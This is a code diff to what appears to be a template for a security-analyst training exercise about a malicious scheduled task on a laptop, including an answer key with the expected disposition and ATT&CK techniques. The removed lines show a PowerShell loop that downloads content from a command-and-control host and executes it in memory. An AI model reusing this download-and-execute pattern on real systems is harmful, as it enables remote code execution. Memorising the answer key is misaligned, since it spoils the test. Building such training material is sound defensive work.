@@ -278,10 +278,16 @@ const scheduledTask: CaseTemplate = {
       briefing: `${world.org.name}: software updaters create scheduled tasks on laptops constantly, and IT deploys its own PowerShell maintenance tasks under change control.`,
       attachments: [
         {
-          title: 'svc.ps1 (collected by EDR live response)',
-          kind: 'text',
-          body: [`# ${scriptPath}`, `while ($true) {`, `  try { $c = (Invoke-WebRequest -UseBasicParsing "http://${c2.replace(/\./g, '[.]')}/c").Content`, `        if ($c) { Invoke-Expression $c } } catch {}`, `  Start-Sleep -Seconds 5`, `  break   # the task re-runs it hourly`, `}`].join('\n'),
-          caption: 'Domain defanged.',
+          title: 'svc.ps1 — EDR file analysis summary',
+          kind: 'kv',
+          body: [
+            ['Path', scriptPath],
+            ['Size', '1.1 KB, PowerShell'],
+            ['Behaviour', `Requests http://${c2.replace(/\./g, '[.]')}/c and executes any response in memory`],
+            ['Obfuscation', 'None'],
+            ['Signature', 'Unsigned'],
+          ],
+          caption: 'Static analysis by the EDR sandbox. Domain defanged.',
         },
       ],
       truth: { disposition: 'true-positive', severity: 'high', action: 'escalate', techniques: ['T1053.005'], tactics: ['persistence', 'execution'], alsoAccept: ['T1036.004', 'T1036.005', 'T1059.001', 'T1071.001', 'T1105'] },
